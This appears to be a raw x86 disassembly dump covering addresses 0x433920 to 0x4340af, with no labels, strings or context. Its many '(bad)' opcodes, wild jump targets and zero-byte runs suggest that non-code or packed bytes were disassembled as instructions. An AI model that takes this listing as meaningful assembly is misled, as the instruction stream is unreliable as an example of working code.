  433920:	push   cs
  433921:	jge    0x433923
  433923:	dec    ebp
  433924:	loop   0x43391e
  433926:	sbb    BYTE PTR [eax+0x2a],0xed
  43392a:	std    
  43392b:	loopne 0x43396a
  43392d:	ins    BYTE PTR es:[edi],dx
  43392e:	xlat   BYTE PTR ds:[ebx]
  43392f:	nop
  433930:	sbb    bh,BYTE PTR [ecx]
  433932:	std    
  433933:	sub    ebx,ebx
  433935:	rol    DWORD PTR [eax+0x56],0xeb
  433939:	(bad)  
  43393a:	unpckhps xmm4,XMMWORD PTR [edx+0x40]
  43393e:	pop    ss
  43393f:	(bad)  
  433940:	push   ss
  433941:	jmp    0xd78dd76c
  433946:	rcl    DWORD PTR [edi+ebx*2-0xa],cl
  43394a:	cmc    
  43394b:	lods   al,BYTE PTR ds:[esi]
  43394c:	jmp    0x433962
  43394e:	mov    WORD PTR [edi],fs
  433950:	push   edx
  433951:	int    0x0
  433953:	add    BYTE PTR [eax],al
  433955:	add    BYTE PTR [eax],al
  433957:	and    esp,0xffffffeb
  43395a:	mov    bh,0x16
  43395c:	jo     0x433978
  43395e:	push   0x20
  433960:	test   al,0xe
  433962:	cmc    
  433963:	xchg   edx,eax
  433964:	int3   
  433965:	push   ss
  433966:	jbe    0x433970
  433968:	test   al,0x99
  43396a:	and    eax,0x663ebc68
  43396f:	cdq    
  433970:	aam    0xd2
  433972:	in     eax,dx
  433973:	push   ss
  433974:	xlat   BYTE PTR ds:[ebx]
  433975:	(bad)  
  433976:	call   0xe1bbe29a
  43397b:	mov    ds:0x4f73fede,al
  433980:	nop
  433981:	cs cdq 
  433983:	add    BYTE PTR [ecx-0x31d8d271],0x16
  43398a:	cs clc 
  43398c:	mov    edi,0x8c2fad99
  433991:	ds push ds
  433993:	leave  
  433994:	cli    
  433995:	inc    ebp
  433996:	fs iret 
  433998:	(bad)  
  433999:	sbb    bh,BYTE PTR [ecx+0xdb2d44]
  43399f:	mov    eax,ds:0xeeffeae9
  4339a4:	mov    ch,0x0
  4339a6:	jmp    DWORD PTR [edi+ebx*2-0x18]
  4339aa:	jne    0x433969
  4339ac:	shl    BYTE PTR [edx+0x8],0xee
  4339b0:	jns    0x43399a
  4339b2:	adc    eax,0x2b6009
  4339b7:	out    0x86,al
  4339b9:	add    al,0xc0
  4339bb:	add    BYTE PTR [eax],al
  4339bd:	add    BYTE PTR [eax],al
  4339bf:	add    dh,ah
  4339c1:	xchg   BYTE PTR [eax+0x5e],cl
  4339c4:	inc    edx
  4339c5:	mov    ecx,DWORD PTR [edx-0x3e]
  4339c8:	leave  
  4339c9:	scas   eax,DWORD PTR es:[edi]
  4339ca:	inc    eax
  4339cb:	mov    ebp,eax
  4339cd:	imul   eax,DWORD PTR ss:[eax],0xffffffa9
  4339d1:	scas   eax,DWORD PTR es:[edi]
  4339d2:	inc    eax
  4339d3:	call   DWORD PTR [ebx+ecx*1+0x19794019]
  4339da:	call   0x2ba27af4
  4339df:	add    BYTE PTR [esi],ah
  4339e1:	xchg   BYTE PTR [eax+eax*8],al
  4339e4:	test   BYTE PTR [esi-0x2a7b3cbb],0xf7
  4339eb:	or     DWORD PTR ds:0xed4d6c5e,0xffffffc1
  4339f2:	pop    esp
  4339f3:	push   esi
  4339f4:	push   ss
  4339f5:	aaa    
  4339f6:	imul   eax,DWORD PTR [eax],0x39
  4339f9:	scas   eax,DWORD PTR es:[edi]
  4339fa:	je     0x4339ff
  4339fc:	push   ebx
  4339fd:	scas   al,BYTE PTR es:[edi]
  4339fe:	jbe    0x433a00
  433a00:	sub    DWORD PTR [edi+0x13bc518e],ebp
  433a06:	out    0x8b,eax
  433a08:	imul   esi,DWORD PTR [esi-0x3ea1042a],0x3c
  433a0f:	(bad)  [ebp-0x6397a012]
  433a15:	imul   edi,ebx,0x50
  433a18:	jl     0x433a2d
  433a1a:	out    0xe8,eax
  433a1c:	nop
  433a1d:	bound  ebx,QWORD PTR [ebx]
  433a1f:	cli    
  433a20:	dec    esp
  433a22:	push   edx
  433a23:	jae    0x433a25
  433a25:	add    BYTE PTR [eax],al
  433a27:	add    BYTE PTR [eax],al
  433a29:	pop    eax
  433a2a:	jb     0x4339e8
  433a2c:	repz cmp BYTE PTR [bp+si+0x7c],ch
  433a31:	loopne 0x433a09
  433a33:	in     al,dx
  433a34:	sbb    bh,0x48
  433a37:	push   fs
  433a39:	nop
  433a3a:	hlt    
  433a3b:	fdivr  DWORD PTR [eax]
  433a3d:	ins    DWORD PTR es:[edi],dx
  433a3e:	jge    0x4339c6
  433a40:	push   es
  433a41:	mov    eax,DWORD PTR [eax+0x43090286]
  433a47:	push   0xca808c59
  433a4c:	xchg   bh,bl
  433a4e:	add    BYTE PTR [edx],0x84
  433a51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433a52:	sbb    ebp,DWORD PTR [eax+0x1]
  433a55:	adc    eax,0x43288309
  433a5a:	fisubr WORD PTR [ebx+esi*8-0x55d771f]
  433a61:	std    
  433a62:	daa    
  433a63:	(bad)  
  433a64:	adc    edx,eax
  433a66:	dec    ebp
  433a67:	iret   
  433a68:	dec    DWORD PTR [esp+ebx*1]
  433a6b:	or     DWORD PTR [ecx],0x1b
  433a6e:	xchg   edi,eax
  433a6f:	push   es
  433a70:	ss dec edi
  433a72:	dec    edi
  433a73:	push   ss
  433a74:	mov    esi,edx
  433a76:	push   edi
  433a77:	inc    edx
  433a78:	add    BYTE PTR [ebx+0x61],ch
  433a7b:	push   0x9
  433a7d:	cmp    ch,dh
  433a7f:	xchg   esp,eax
  433a80:	cli    
  433a81:	inc    edi
  433a82:	xlat   BYTE PTR ds:[ebx]
  433a83:	lods   al,BYTE PTR ds:[esi]
  433a84:	sti    
  433a85:	sub    BYTE PTR [edx+ebx*1],bl
  433a88:	cli    
  433a89:	aaa    
  433a8a:	(bad)  
  433a8b:	push   edx
  433a8c:	pop    edx
  433a8d:	add    BYTE PTR [eax],al
  433a8f:	add    BYTE PTR [eax],al
  433a91:	add    dh,cl
  433a93:	adc    al,0x28
  433a95:	mov    ebp,0x86a45b8c
  433a9a:	sub    al,0xd5
  433a9c:	aam    0x7
  433a9e:	mov    esi,0x87cacb2
  433aa3:	(bad)  
  433aa5:	jl     0x433a29
  433aa7:	mov    edx,0xdc934978
  433aac:	idiv   BYTE PTR [edx+0x51]
  433aaf:	mov    dh,0x60
  433ab1:	(bad)  
  433ab2:	fwait
  433ab3:	cmp    esi,ebx
  433ab5:	jl     0x433b11
  433ab7:	mov    edx,0x515d550d
  433abc:	cld    
  433abd:	mov    dl,0x6d
  433abf:	mov    dl,0x62
  433ac1:	leave  
  433ac2:	xchg   edi,eax
  433ac3:	loop   0x433b04
  433ac5:	add    eax,0x4c5162
  433aca:	mov    ebx,0xc882f1e9
  433acf:	push   ecx
  433ad0:	jp     0x433b16
  433ad2:	call   0xb63d:0x4afc3af6
  433ad9:	scas   al,BYTE PTR es:[edi]
  433ada:	cmp    al,0x74
  433adc:	in     eax,dx
  433add:	add    edi,DWORD PTR ds:0x16b5813d
  433ae3:	neg    ebp
  433ae5:	mov    ch,0xe2
  433ae7:	cmp    eax,0x3c7f9a7e
  433aec:	add    al,0xfc
  433aee:	idiv   BYTE PTR [eax-0x7]
  433af1:	cdq    
  433af2:	nop
  433af3:	cmp    esi,DWORD PTR [ebx]
  433af5:	or     BYTE PTR [eax],al
  433af7:	add    BYTE PTR [eax],al
  433af9:	add    BYTE PTR [eax],al
  433afb:	maskmovq mm6,mm1
  433afe:	jl     0x433a91
  433b00:	cmp    eax,0xd7d6fc0c
  433b05:	fld    QWORD PTR [ebx]
  433b07:	cmp    dl,bl
  433b09:	ja     0x433b1a
  433b0b:	dec    edx
  433b0c:	loop   0x433b80
  433b0e:	leave  
  433b0f:	xchg   edi,eax
  433b10:	loop   0x433b5c
  433b12:	leave  
  433b13:	cmp    esp,edx
  433b15:	mov    edi,0xa451c204
  433b1a:	jmp    FWORD PTR [edx]
  433b1c:	jmp    0x7a56282f
  433b21:	jmp    0x433b87
  433b23:	int3   
  433b24:	mov    esp,0xec9fb452
  433b29:	xchg   edi,eax
  433b2a:	sub    BYTE PTR [esi],dh
  433b2c:	jp     0x433afe
  433b2e:	loope  0x433ac3
  433b30:	out    0x97,eax
  433b32:	std    
  433b33:	adc    dl,BYTE PTR [ebp-0x1a]
  433b36:	push   0xffffffb0
  433b38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433b39:	mov    ?,WORD PTR [ebx+edi*8+0x50]
  433b3d:	inc    eax
  433b3e:	bound  esp,QWORD PTR [ecx]
  433b40:	xchg   ebp,eax
  433b41:	inc    esp
  433b42:	xchg   esi,eax
  433b43:	pop    edx
  433b44:	into   
  433b45:	(bad)  
  433b46:	jae    0x433b1e
  433b48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433b49:	cdq    
  433b4a:	push   esi
  433b4b:	sbb    al,0xbc
  433b4d:	push   edx
  433b4e:	(bad)  
  433b50:	adc    BYTE PTR [esi-0x38c87321],cl
  433b56:	cmp    eax,0xd94f89d1
  433b5b:	(bad)  
  433b5c:	clc    
  433b5d:	and    eax,0x2f
  433b62:	add    BYTE PTR [eax],al
  433b64:	(bad)  
  433b65:	lds    esi,FWORD PTR [eax]
  433b67:	sbb    esp,ebx
  433b69:	(bad)  
  433b6a:	or     eax,0xe2a69f39
  433b6f:	stc    
  433b70:	push   ebx
  433b71:	push   eax
  433b72:	xchg   esi,eax
  433b73:	das    
  433b74:	fs aaa 
  433b76:	into   
  433b77:	adc    al,0x7c
  433b79:	(bad)  
  433b7a:	push   ss
  433b7b:	xchg   BYTE PTR [eax-0x7c],ch
  433b7e:	add    al,0x29
  433b80:	mov    edi,cs
  433b82:	(bad)  
  433b83:	jbe    0x433c01
  433b85:	inc    esi
  433b86:	push   cs
  433b87:	jmp    0x594731f
  433b8c:	sub    ah,BYTE PTR [ebp+edx*4+0x543f0ba7]
  433b93:	sbb    eax,0xaf960003
  433b98:	test   DWORD PTR [ecx+eax*1+0x0],0x2b45f5
  433ba0:	mov    ds:0x6d833b75,al
  433ba5:	dec    edi
  433ba6:	xchg   esi,eax
  433ba7:	inc    esi
  433ba8:	in     eax,dx
  433ba9:	lods   al,BYTE PTR ds:[esi]
  433baa:	in     al,dx
  433bab:	mov    BYTE PTR [edi],bh
  433bad:	adc    BYTE PTR [ebp+ecx*2-0x1703fb],dl
  433bb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433bb5:	inc    eax
  433bb6:	add    DWORD PTR es:[esi-0x6eefd089],ebp
  433bbd:	xlat   BYTE PTR ds:[ebx]
  433bbe:	sub    eax,DWORD PTR [eax]
  433bc0:	div    BYTE PTR [ecx+0xe]
  433bc3:	mov    DWORD PTR ds:0x8b1758,ebp
  433bc9:	add    BYTE PTR [eax],al
  433bcb:	add    BYTE PTR [eax],al
  433bcd:	sub    al,0x4c
  433bcf:	xchg   esi,eax
  433bd0:	inc    esp
  433bd1:	popf   
  433bd2:	dec    edx
  433bd3:	xchg   esp,eax
  433bd4:	inc    edi
  433bd5:	mov    ch,0xcc
  433bd7:	dec    edi
  433bd8:	and    al,0xc5
  433bda:	ror    BYTE PTR [edi+0x24],1
  433bdd:	mov    ecx,0x9d449a03
  433be2:	inc    esi
  433be3:	pop    ebx
  433be4:	jmp    FWORD PTR [eax-0x46]
  433be7:	xchg   ebx,eax
  433be8:	dec    ebp
  433be9:	mov    ch,0xcc
  433beb:	pop    edi
  433bec:	and    al,0x8d
  433bee:	scas   al,BYTE PTR es:[edi]
  433bef:	int3   
  433bf0:	dec    edx
  433bf1:	jns    0x433ba6
  433bf3:	cmp    ebx,ebx
  433bf5:	(bad)
  433bfa:	sub    dh,BYTE PTR [eax+0x48]
  433bfd:	popf   
  433bfe:	push   edi
  433bff:	push   ebx
  433c00:	je     0x433c63
  433c02:	or     esp,DWORD PTR [edx-0x7e]
  433c05:	or     DWORD PTR [esi+0x48],0xffffffeb
  433c09:	ins    BYTE PTR es:[edi],dx
  433c0a:	dec    BYTE PTR [ebp+0x27]
  433c0d:	imul   esi,DWORD PTR [ebx+0x674cff3f],0xcc393ffd
  433c17:	inc    ebp
  433c18:	push   eax
  433c19:	nop
  433c1a:	sar    BYTE PTR [ebx+edx*2-0x174880f7],cl
  433c21:	mov    bl,0xf8
  433c23:	sbb    edx,edi
  433c25:	daa    
  433c26:	mov    di,0xd011
  433c2a:	pop    ecx
  433c2b:	data16 xlat BYTE PTR ds:[ebx]
  433c2d:	adc    DWORD PTR [ebx+esi*1+0xfe],eax
  433c34:	add    BYTE PTR [eax],al
  433c36:	mulps  xmm0,XMMWORD PTR [edx+ebx*1+0x52e32607]
  433c3e:	jmp    FWORD PTR ds:0x517dfaf7
  433c44:	pop    es
  433c45:	or     edx,DWORD PTR [edx-0x2f7bf0a7]
  433c4b:	pop    edi
  433c4c:	xchg   esp,eax
  433c4d:	cmp    ebx,edi
  433c4f:	inc    edi
  433c50:	sbb    ah,BYTE PTR [ebp-0x78]
  433c53:	pusha  
  433c54:	in     al,0x33
  433c56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433c57:	cdq    
  433c58:	adc    bh,BYTE PTR [edi+0x2e]
  433c5b:	mov    DWORD PTR [edx],edx
  433c5d:	jg     0x433c95
  433c5f:	lea    edx,[edx]
  433c61:	mov    DWORD PTR [esi-0x7f],edx
  433c64:	pop    es
  433c65:	and    ebp,DWORD PTR [edi+0x4d861a77]
  433c6b:	gs call 0xa417bcb3
  433c71:	and    eax,DWORD PTR [esp+edx*8+0x61b1fd4]
  433c78:	push   0xa286190f
  433c7d:	mov    dh,bl
  433c7f:	(bad)  
  433c80:	addr16 pop ecx
  433c82:	fdiv   DWORD PTR [ebx]
  433c84:	repnz sub BYTE PTR [edi+0x35],0xbe
  433c89:	mov    edi,0x86b5adc7
  433c8e:	jne    0x433c37
  433c90:	push   eax
  433c91:	pop    ds
  433c92:	nop
  433c93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433c94:	gs jmp 0x433caa
  433c97:	mov    bl,0x59
  433c99:	or     eax,DWORD PTR [eax]
  433c9b:	add    BYTE PTR [eax],al
  433c9d:	add    BYTE PTR [eax],al
  433c9f:	(bad)  
  433ca0:	pop    esi
  433ca1:	sbb    DWORD PTR [ecx+0x684de5e1],esi
  433ca7:	js     0x433cf6
  433ca9:	pop    esp
  433caa:	js     0x433c78
  433cac:	mov    edx,0xf20f03bf
  433cb1:	stc    
  433cb2:	and    DWORD PTR [esi-0x30810a46],0xffffffa6
  433cb9:	dec    edx
  433cba:	xchg   ebx,eax
  433cbb:	jg     0x433c7a
  433cbd:	mov    ecx,0xfd7d0e12
  433cc2:	inc    esp
  433cc3:	jg     0x433d12
  433cc5:	add    al,0x78
  433cc7:	dec    esi
  433cc8:	mov    esi,0xa1b3c733
  433ccd:	cmc    
  433cce:	js     0x433d38
  433cd0:	mov    esi,0x96b3bf7a
  433cd5:	xchg   BYTE PTR [ecx-0x1876c129],bl
  433cdb:	scas   eax,DWORD PTR es:[edi]
  433cdc:	jecxz  0x433d03
  433cde:	mov    bl,0xca
  433ce0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433ce1:	sbb    eax,0x7ab27ff2
  433ce6:	inc    esp
  433ce7:	cmp    al,0x80
  433ce9:	fdivr  st(1),st
  433ceb:	jg     0x433c91
  433ced:	xor    eax,0xf8566504
  433cf2:	add    edx,DWORD PTR [eax-0x6f418643]
  433cf8:	mov    dl,0xf5
  433cfa:	enter  0x95c1,0xf5
  433cfe:	add    edi,esp
  433d00:	mov    ds:0xc0b3,al
  433d05:	add    BYTE PTR [eax],al
  433d07:	add    BYTE PTR [ebx+0x56c8f5a1],dh
  433d0d:	mov    cl,0xf5
  433d0f:	add    ebx,DWORD PTR [ebx-0x6ffb7dc9]
  433d15:	mov    dl,0xb3
  433d17:	shl    BYTE PTR [ebx+0x74e80ea1],0x6c
  433d1e:	push   cs
  433d1f:	jmp    0xf1aa6fb7
  433d24:	xchg   ebx,eax
  433d25:	xor    eax,0xc9bce54f
  433d2a:	xor    bl,BYTE PTR ds:0x261ac4b7
  433d30:	push   eax
  433d31:	xchg   ecx,eax
  433d32:	ss inc ecx
  433d34:	mov    al,0x8d
  433d36:	push   cs
  433d37:	jo     0x433d89
  433d39:	xchg   ecx,eax
  433d3a:	cmp    ah,BYTE PTR [eax+0x0]
  433d3d:	xchg   ecx,eax
  433d3e:	push   ds
  433d3f:	mov    ah,0xb
  433d41:	xor    dl,bl
  433d43:	cmp    DWORD PTR [edx+esi*4+0x3392120e],ecx
  433d4a:	shr    DWORD PTR [ecx-0x73],cl
  433d4d:	mov    dl,0xe
  433d4f:	(bad)
  433d54:	fwait
  433d55:	dec    eax
  433d56:	imul   eax,eax,0xffffffe3
  433d59:	xor    edx,DWORD PTR [esi-0x13]
  433d5c:	fimul  DWORD PTR [esi-0x4ae49602]
  433d62:	push   cs
  433d63:	jb     0x433d6c
  433d65:	xchg   ecx,eax
  433d66:	push   es
  433d67:	jo     0x433d70
  433d69:	xchg   ecx,eax
  433d6a:	cs pusha 
  433d6c:	add    BYTE PTR [eax],al
  433d6e:	add    BYTE PTR [eax],al
  433d70:	add    bh,ah
  433d72:	nop
  433d73:	or     ah,BYTE PTR [eax-0x1]
  433d76:	nop
  433d77:	add    bh,BYTE PTR [esi+ebx*4]
  433d7a:	cld    
  433d7b:	xchg   edi,eax
  433d7c:	scas   al,BYTE PTR es:[edi]
  433d7d:	jnp    0x433da1
  433d7f:	dec    edi
  433d80:	jmp    0x5857318
  433d85:	js     0x433dbc
  433d87:	pop    edx
  433d88:	int    0x73
  433d8a:	push   ebp
  433d8b:	das    
  433d8c:	fs rol esi,cl
  433d8f:	adc    eax,0xe1ffa6a
  433d94:	jmp    0x13a852c
  433d99:	jae    0x433e16
  433d9b:	jmp    0x433dbc
  433d9d:	imul   esi,DWORD PTR [eax-0x2f15d499],0xb039008b
  433da7:	push   cs
  433da8:	mov    DWORD PTR [esi+0x29ffebd3],esi
  433dae:	loopne 0x433dbe
  433db0:	test   BYTE PTR [ecx+0x3b],ch
  433db3:	add    ecx,DWORD PTR [ebp+0x50336bf5]
  433db9:	pushf  
  433dba:	or     ebp,DWORD PTR [edi]
  433dbc:	sbb    cl,bh
  433dbe:	push   es
  433dbf:	xchg   esp,eax
  433dc0:	iret   
  433dc1:	shl    DWORD PTR [edi+0x56],1
  433dc4:	add    cl,bh
  433dc6:	int3   
  433dc7:	aas    
  433dc8:	and    al,0x5
  433dca:	lods   eax,DWORD PTR ds:[esi]
  433dcb:	in     al,dx
  433dcc:	imul   esi,ebp,0xd2c93c17
  433dd2:	neg    BYTE PTR [edi+0x4d]
  433dd5:	add    BYTE PTR [eax],al
  433dd7:	add    BYTE PTR [eax],al
  433dd9:	add    BYTE PTR [ecx],dh
  433ddb:	cmp    al,0x28
  433ddd:	dec    eax
  433dde:	gs pop ecx
  433de0:	push   ebx
  433de1:	je     0x433dd1
  433de3:	pop    es
  433de4:	bound  ecx,QWORD PTR [edx+0x70]
  433de7:	or     DWORD PTR [ebx-0x39],ebx
  433dea:	not    DWORD PTR [edi]
  433dec:	adc    eax,DWORD PTR [eax]
  433dee:	mov    ecx,0x403bf3af
  433df3:	or     BYTE PTR [ebx-0x39],bl
  433df6:	addr16 push ds
  433df8:	dec    ebp
  433df9:	daa    
  433dfa:	mov    ecx,0x222ff3af
  433dff:	jae    0x433e3c
  433e01:	push   ss
  433e02:	imul   esi,DWORD PTR [esi-0x53632819],0x3b79ffec
  433e0c:	push   ebx
  433e0d:	inc    DWORD PTR [esi+0x35]
  433e10:	ins    DWORD PTR es:[edi],dx
  433e11:	push   eax
  433e12:	imul   esi,DWORD PTR [esi],0x5990546d
  433e18:	push   0xde30c841
  433e1d:	xchg   bl,bl
  433e1f:	inc    ebp
  433e20:	push   0x3e
  433e22:	add    BYTE PTR [edx-0x30],0xf
  433e26:	mov    ds:0xe0516712,eax
  433e2b:	shr    BYTE PTR [eax-0x44fce6a9],cl
  433e31:	cli    
  433e32:	sub    esp,0xfffffffb
  433e35:	fbld   TBYTE PTR [ecx-0x537ff0e7]
  433e3b:	mov    ch,0xe1
  433e3d:	inc    DWORD PTR [eax]
  433e3f:	add    BYTE PTR [eax],al
  433e41:	add    BYTE PTR [eax],al
  433e43:	pushf  
  433e44:	pop    esp
  433e45:	push   0xffffffc9
  433e47:	sub    cl,bl
  433e49:	xchg   ebp,eax
  433e4a:	cli    
  433e4b:	pop    ss
  433e4c:	shr    BYTE PTR [ecx+0x15f6f80b],1
  433e52:	stc    
  433e53:	pop    es
  433e54:	shr    BYTE PTR [ecx],0xe7
  433e57:	mov    esp,0x6afa15d7
  433e5c:	pop    ecx
  433e5d:	push   ss
  433e5e:	xor    al,0xa0
  433e60:	int    0xab
  433e62:	jmp    esi
  433e64:	ins    DWORD PTR es:[edi],dx
  433e65:	mov    bl,0x10
  433e67:	push   eax
  433e68:	pop    ecx
  433e69:	mov    dh,0x59
  433e6b:	cmp    edx,eax
  433e6d:	or     ebx,DWORD PTR [edx+edx*8+0x50]
  433e71:	cmovg  ebx,DWORD PTR [edx]
  433e74:	cmc    
  433e75:	out    dx,al
  433e76:	or     esp,DWORD PTR [ebp-0x7c]
  433e79:	imul   edi,DWORD PTR [ebx+0x6c],0x1dd66b41
  433e80:	xchg   esp,eax
  433e81:	fimul  WORD PTR [edi+edx*2-0x71007377]
  433e88:	xchg   ebp,eax
  433e89:	sub    ah,bh
  433e8b:	jl     0x433e11
  433e8d:	adc    eax,0x6c741bfa
  433e92:	in     al,dx
  433e93:	std    
  433e94:	mov    dl,0xf9
  433e96:	aad    0x3f
  433e98:	pop    esi
  433e99:	adc    dh,BYTE PTR [edx+0x40f9eed]
  433e9f:	imul   eax,DWORD PTR [eax-0x4d2c7b33],0xffffff94
  433ea6:	out    dx,al
  433ea7:	add    BYTE PTR [eax],al
  433ea9:	add    BYTE PTR [eax],al
  433eab:	add    bh,ah
  433ead:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433eae:	xor    eax,0x7a430f04
  433eb3:	adc    ebx,eax
  433eb5:	icebp  
  433eb6:	jo     0x433e77
  433eb8:	jae    0x433e58
  433eba:	js     0x433e9d
  433ebc:	aas    
  433ebd:	cmp    esi,DWORD PTR [ebx+0x19ef0eff]
  433ec3:	in     al,0x18
  433ec5:	icebp  
  433ec6:	in     eax,0x76
  433ec8:	shr    BYTE PTR [esi-0x4546847b],cl
  433ece:	pop    esi
  433ecf:	mov    DWORD PTR [ebx-0x5f6835b7],ecx
  433ed5:	repnz cmc 
  433ed7:	popf   
  433ed8:	xchg   ebx,eax
  433ed9:	fdiv   QWORD PTR [ecx+esi*4]
  433edc:	ja     0x433f3c
  433ede:	clc    
  433edf:	(bad)  
  433ee0:	test   DWORD PTR [eax-0x76],0xe24941f3
  433ee7:	pop    ds
  433ee8:	xor    dl,0xf5
  433eeb:	jle    0x433f0c
  433eed:	rol    bh,0x7c
  433ef0:	retf   0xbb5a
  433ef3:	or     cl,cl
  433ef5:	dec    ecx
  433ef6:	jo     0x433f31
  433ef8:	scas   eax,DWORD PTR es:[edi]
  433ef9:	adc    dh,BYTE PTR [esi+0x7]
  433efc:	mov    edx,0xb51bb584
  433f01:	sbb    esi,esi
  433f03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433f04:	dec    edx
  433f05:	out    0x20,eax
  433f07:	inc    edx
  433f08:	xchg   edi,eax
  433f09:	mov    dl,0xb
  433f0b:	jnp    0x433ead
  433f0d:	jno    0x433f02
  433f0f:	retf   
  433f10:	add    BYTE PTR [eax],al
  433f12:	add    BYTE PTR [eax],al
  433f14:	add    BYTE PTR [ebx],cl
  433f16:	repz push cs
  433f18:	jmp    0xe95a122f
  433f1d:	adc    dl,bl
  433f1f:	sbb    ch,cl
  433f21:	clc    
  433f22:	repz add bh,BYTE PTR [ecx]
  433f25:	mov    dh,0xf3
  433f27:	(bad)  
  433f28:	out    0xae,eax
  433f2a:	repz adc ah,cl
  433f2d:	lds    ecx,FWORD PTR [ecx+0x3561860e]
  433f33:	add    BYTE PTR [ecx],ch
  433f35:	mov    ecx,cs
  433f37:	je     0x433efe
  433f39:	xchg   ebx,eax
  433f3a:	xor    esp,edx
  433f3c:	psrlq  mm6,QWORD PTR [ebp+ecx*1+0x21]
  433f41:	mov    eax,0xcd6a0e89
  433f46:	mov    ch,0xf5
  433f48:	cmp    ebx,DWORD PTR [ecx+ecx*2-0x15]
  433f4c:	mov    ah,0xaa
  433f4e:	pop    ebp
  433f4f:	cmp    eax,0x8aa69a9a
  433f54:	rcl    bh,cl
  433f56:	dec    eax
  433f57:	inc    ecx
  433f58:	bound  esp,QWORD PTR [ecx]
  433f5a:	mov    ebp,0x82203791
  433f5f:	(bad)  
  433f60:	daa    
  433f61:	xchg   edi,eax
  433f62:	lds    edi,FWORD PTR [edx]
  433f64:	mov    dh,0x78
  433f66:	rol    BYTE PTR [edx],0xbe
  433f69:	xchg   esi,eax
  433f6a:	sahf   
  433f6b:	fdivp  st(3),st
  433f6d:	ror    DWORD PTR [eax+0x3e],cl
  433f70:	xchg   ebx,eax
  433f71:	xchg   ebx,eax
  433f72:	in     al,0x78
  433f74:	jmp    0x0:0x112f058
  433f7b:	add    BYTE PTR [eax],al
  433f7d:	add    al,ch
  433f7f:	mov    DWORD PTR [esi],ecx
  433f81:	jmp    0xe7216f7c
  433f86:	rcl    BYTE PTR [eax+0x0],0x29
  433f8a:	mov    WORD PTR [ecx-0x43629332],ds
  433f90:	sub    DWORD PTR [ecx+0x104fee],0x5b45f49b
  433f9a:	loopne 0x433f8e
  433f9c:	pop    ss
  433f9d:	add    BYTE PTR [edi-0x72836be9],ch
  433fa3:	ds xchg esp,eax
  433fa5:	icebp  
  433fa6:	in     al,dx
  433fa7:	mov    al,0x5f
  433fa9:	jb     0x433f95
  433fab:	mov    al,0xe8
  433fad:	je     0x433f43
  433faf:	add    eax,DWORD PTR [edx-0x73]
  433fb2:	mov    bh,0x42
  433fb4:	pop    esp
  433fb5:	(bad)  
  433fb6:	cmp    al,0xa4
  433fb8:	sbb    DWORD PTR [eax+0x69],eax
  433fbb:	sub    ch,bl
  433fbd:	push   esi
  433fbe:	(bad)  
  433fbf:	aaa    
  433fc0:	das    
  433fc1:	sbb    al,0xe4
  433fc3:	sbb    eax,0xab848b0f
  433fc8:	test   DWORD PTR [eax],edi
  433fca:	sub    DWORD PTR [ebx+edx*4+0x62b5bcf0],esi
  433fd1:	and    eax,0x1c2f2fb9
  433fd6:	sub    BYTE PTR [ebx],ah
  433fd8:	sbb    eax,0xb67ed38
  433fdd:	push   ecx
  433fde:	rol    DWORD PTR [edi+0x46],cl
  433fe1:	sldt   WORD PTR [eax]
  433fe4:	add    BYTE PTR [eax],al
  433fe6:	add    BYTE PTR [edi+ebp*8],ch
  433fe9:	pop    ebx
  433fea:	push   edi
  433feb:	mov    dh,0x37
  433fed:	das    
  433fee:	and    BYTE PTR [edx-0x3e410c76],al
  433ff4:	mov    bl,0xe
  433ff6:	mov    ecx,DWORD PTR [ecx-0xe8b22ce]
  433ffc:	int3   
  433ffd:	dec    ebp
  433ffe:	adc    BYTE PTR [edx-0x6d],ch
  434001:	in     al,dx
  434002:	cmp    edi,DWORD PTR [edx-0x40ccf0de]
  434008:	test   eax,0xb26f8d11
  43400d:	ds (bad) 
  43400f:	mov    esp,0x903ffe1f
  434014:	pop    ecx
  434015:	sahf   
  434016:	cli    
  434017:	jge    0x43408a
  434019:	loopne 0x43405a
  43401b:	nop
  43401c:	mov    fs,WORD PTR [ebp-0x3f]
  43401f:	cmp    esp,DWORD PTR [eax+edx*1+0x2f]
  434023:	push   eax
  434024:	mov    al,ds:0x59a0bdb4
  434029:	mov    al,ds:0xe375fc7e
  43402e:	(bad)  
  43402f:	faddp  st(4),st
  434031:	pop    ss
  434032:	jae    0x43400e
  434034:	fcom   QWORD PTR [esi+0x7e388023]
  43403a:	ds ret 
  43403c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43403d:	arpl   WORD PTR [edx+0x7c],bp
  434040:	sahf   
  434041:	rcl    dh,0x4f
  434044:	dec    WORD PTR [eax+edx*8]
  434048:	pop    ecx
  434049:	fs inc ebx
  43404b:	add    BYTE PTR [eax],al
  43404d:	add    BYTE PTR [eax],al
  43404f:	add    BYTE PTR [ebp+edi*1-0x61],dh
  434053:	cli    
  434054:	mov    esp,0xdf8cf6ad
  434059:	push   ebp
  43405a:	adc    dh,BYTE PTR [ebx+0x6c]
  43405d:	push   ebp
  43405e:	pop    es
  43405f:	or     eax,0x850f5958
  434064:	push   eax
  434065:	std    
  434066:	loope  0x433fee
  434068:	push   edi
  434069:	push   ebp
  43406a:	adc    dh,BYTE PTR [ebx-0x54]
  43406d:	gs fs dec edx
  434070:	xchg   esp,eax
  434071:	nop
  434072:	mov    ds:0xbb9bf603,al
  434077:	cli    
  434078:	test   DWORD PTR [ecx+0x16903fe0],esi
  43407e:	gs mov esi,0x2e10a43b
  434084:	shl    BYTE PTR [edi],1
  434086:	mov    eax,0x8e5998bd
  43408b:	jnp    0x4340f9
  43408d:	imul   edx,DWORD PTR [eax],0x60b26655
  434093:	(bad)  
  434094:	jae    0x434024
  434096:	and    al,0x8f
  434098:	dec    ebx
  434099:	xor    eax,DWORD PTR [ecx-0x20]
  43409c:	xchg   DWORD PTR [edx-0x39e150bf],esi
  4340a2:	sbb    eax,esp
  4340a4:	xchg   edi,eax
  4340a5:	mov    ebp,0xbf817f3b
  4340aa:	das    
  4340ab:	shl    DWORD PTR [esp+ecx*4+0x2b],1
  4340af:	hlt    
